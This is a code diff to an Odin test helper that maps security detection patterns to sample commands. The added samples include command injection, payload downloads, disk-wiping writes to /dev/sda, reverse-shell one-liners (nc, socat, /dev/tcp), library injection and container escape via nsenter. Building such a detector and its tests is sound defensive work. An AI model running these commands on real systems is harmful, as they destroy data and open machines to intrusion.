@@ -37,10 +37,50 @@ sample_for_pattern :: proc(p: security.Pattern) -> string {
 		return "printf \"\\x63\\x75\\x72\\x6c\""
 	case `xxd\s+-r\s+-p`:
 		return "xxd -r -p payload.hex"
+	case `;\s*\$\(`:
+		return "echo ok;$(whoami)"
+	case `\|\s*\$\(`:
+		return "echo ok | $(whoami)"
+	case `&&\s*curl`:
+		return "true && curl https://example.com/payload"
+	case `\|\|\s*wget`:
+		return "false || wget https://example.com/payload"
+	case `\|\s*sed.*-e.*\|`:
+		return "cat file | sed -e 's/a/b/' | sed -e 's/c/d/'"
+	case `sed.*'s/.*\$\([^']*\)'`:
+		return "sed 's/$(whoami)/x/' file"
 	case `rm\s+-rf\s+/`:
 		return "rm -rf /"
 	case `dd\s+if=`:
 		return "dd if=/dev/zero of=/dev/sda"
+	case `>\s*/dev/sda`:
+		return "echo boom > /dev/sda"
+	case `>\s*/dev/nvme`:
+		return "echo boom > /dev/nvme0n1"
+	case `/dev/tcp/`:
+		return "bash -c 'echo ok >/dev/tcp/127.0.0.1/4444'"
+	case `/dev/udp/`:
+		return "bash -c 'echo ok >/dev/udp/127.0.0.1/4444'"
+	case `nc\s+-e\s+/bin/sh`:
+		return "nc -e /bin/sh 127.0.0.1 4444"
+	case `socat\s+exec:`:
+		return "socat exec:/bin/sh tcp:127.0.0.1:4444"
+	case `ptrace`:
+		return "ptrace PTRACE_ATTACH 1234"
+	case `/proc/[^\\s]+/mem`:
+		return "cat /proc/1234/mem"
+	case `LD_PRELOAD`:
+		return "LD_PRELOAD=/tmp/inject.so ls"
+	case `DYLD_INSERT_LIBRARIES`:
+		return "DYLD_INSERT_LIBRARIES=/tmp/inject.dylib ls"
+	case `/proc/self/exe`:
+		return "cat /proc/self/exe"
+	case `/proc/\\d+/root`:
+		return "ls /proc/1234/root"
+	case `nsenter`:
+		return "nsenter -t 1 -m /bin/sh"
+	case `/sys/fs/cgroup`:
+		return "ls /sys/fs/cgroup"
 	case `curl\s+http://`:
 		return "curl http://example.com/data.json"
 	case `chmod\s+\+s`:
